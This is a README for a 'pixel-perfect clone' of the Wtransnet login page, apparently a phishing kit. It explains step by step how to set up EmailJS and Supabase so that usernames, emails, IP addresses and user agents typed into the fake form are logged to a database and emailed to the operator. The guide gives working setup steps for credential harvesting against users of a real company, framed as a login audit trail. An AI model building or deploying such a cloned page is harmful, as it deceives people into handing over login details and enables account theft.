# Wtransnet Login Page - Setup Guide

## Overview
This is a pixel-perfect clone of the Wtransnet login page with integrated EmailJS and Supabase functionality for receiving user credentials and login attempts.

## Prerequisites
- Node.js 16+
- npm or yarn
- EmailJS account
- Supabase account (already configured)

## Installation

1. **Install dependencies** (already done):
```bash
npm install
```

## Configuration

### 1. EmailJS Setup

#### Step 1: Create an EmailJS Account
1. Go to [EmailJS.com](https://www.emailjs.com/)
2. Sign up or log in
3. Go to the Email Services section and set up:
   - Gmail, Outlook, or any supported email service
   - Create a connection

#### Step 2: Create an Email Template
1. Go to Email Templates
2. Click "Create New Template"
3. Set up a template with the following variables:
   ```
   {{username}} - User's username
   {{user_email}} - User's email
   {{timestamp}} - Login timestamp
   {{ip_address}} - Client IP address
   {{remember_me}} - Remember me preference
   {{to_email}} - Recipient email
   ```

#### Step 3: Get Your Credentials
1. Copy your **Public Key** from the dashboard
2. Copy your **Service ID**
3. Copy your **Template ID**

#### Step 4: Update main.js
Replace the following in `main.js`:
```javascript
emailjs.init('YOUR_EMAILJS_PUBLIC_KEY');  // Line 9

// In the emailjs.send() call around line 69-72:
const emailResponse = await emailjs.send(
  'YOUR_EMAILJS_SERVICE_ID',
  'YOUR_EMAILJS_TEMPLATE_ID',
  emailParams
);

// Update the recipient email around line 61:
to_email: 'your-email@gmail.com',
```

### 2. Supabase Configuration

The Supabase database is already configured with:
- Database URL
- Anon Key
- Login attempts table with proper security

#### Table Structure
```sql
CREATE TABLE login_attempts (
  id uuid PRIMARY KEY,
  username text NOT NULL,
  email text,
  login_timestamp timestamptz,
  ip_address text,
  user_agent text
);
```

All login attempts are automatically saved to this table.

## Features

### 1. User Input Collection
- Username field (accepts email or username)
- Password field (for UI purposes - actual authentication should be on backend)
- Remember me checkbox
- Form validation

### 2. Data Storage
- **Supabase**: Logs all login attempts with:
  - Username
  - Email
  - IP Address
  - User Agent
  - Timestamp

- **EmailJS**: Sends email notification with login details to your configured email

### 3. Data Sent to Email
```
From: User's submitted username
Email: User's email or generated @wtransnet.com
Timestamp: When the login was attempted
IP Address: Client's IP address
Remember Me: Yes/No
```

## How It Works

1. **User submits the form**
   - Username and password validation
   - Button changes to "Logging in..."

2. **Email generation**
   - Username is processed (if not an email, @wtransnet.com is appended)
   - Client IP is fetched from ipify API
   - User agent is captured

3. **Data is saved to Supabase**
   - Login attempt is recorded in the `login_attempts` table
   - Includes all relevant data for audit trail

4. **Email is sent via EmailJS**
   - Uses your configured email template
   - Contains all login attempt details
   - Sent to your specified email address

5. **User receives confirmation**
   - Success message with login details
   - Form is cleared for next attempt
   - Any errors are displayed to the user

## Running the Project

### Development
```bash
npm run dev
```

### Build for Production
```bash
npm run build
```

### Preview Production Build
```bash
npm run preview
```

## Testing

To test the integration:

1. Fill in the login form with:
   - Username: `testuser` or `test@example.com`
   - Password: `password123`
   - Check "Remember me" (optional)

2. Click "Login"

3. Check:
   - Console logs for any errors
   - Your email for the login notification
   - Supabase dashboard > SQL Editor to view the `login_attempts` table

## Database Access

To view login attempts in Supabase:

```sql
SELECT * FROM login_attempts
ORDER BY login_timestamp DESC;
```

## Security Notes

- **Never store actual passwords** - This is UI only
- Implement proper authentication on your backend
- EmailJS Public Key is safe to expose (it's front-end)
- Service IDs and Template IDs are configured securely
- Use HTTPS in production
- Implement rate limiting on your backend
- Add CSRF protection for production

## Environment Variables

The app uses these environment variables (in `.env`):
```
VITE_SUPABASE_URL=your_supabase_url
VITE_SUPABASE_ANON_KEY=your_anon_key
```

These are automatically available in the project.

## Troubleshooting

### Emails not sending?
- Verify EmailJS credentials are correct
- Check email template variables match the code
- Check spam folder
- Verify email service is connected in EmailJS dashboard

### Supabase errors?
- Check network tab in browser DevTools
- Verify Supabase credentials in `.env`
- Check Row Level Security policies are correct
- Verify table exists: `SELECT * FROM login_attempts LIMIT 1;`

### IP Address not available?
- ipify API might be blocked
- Falls back to "Unknown" if unavailable
- Check browser console for CORS errors

## Browser Support

- Chrome/Edge 90+
- Firefox 88+
- Safari 14+
- Mobile browsers (iOS Safari, Chrome Mobile)

## Project Structure

```
project/
├── index.html          # Main HTML file
├── style.css           # All custom CSS (no frameworks)
├── main.js             # JavaScript with EmailJS/Supabase
├── package.json        # Dependencies
├── .env                # Environment variables
└── dist/               # Production build
```

## Next Steps

1. Set up your EmailJS account and get credentials
2. Update `main.js` with your EmailJS Public Key, Service ID, and Template ID
3. Update the recipient email address
4. Test the form
5. Monitor the Supabase table and email notifications
6. Implement backend authentication when ready

## Support

For issues with:
- **EmailJS**: https://www.emailjs.com/docs/
- **Supabase**: https://supabase.com/docs
- **This project**: Check the code comments in `main.js`
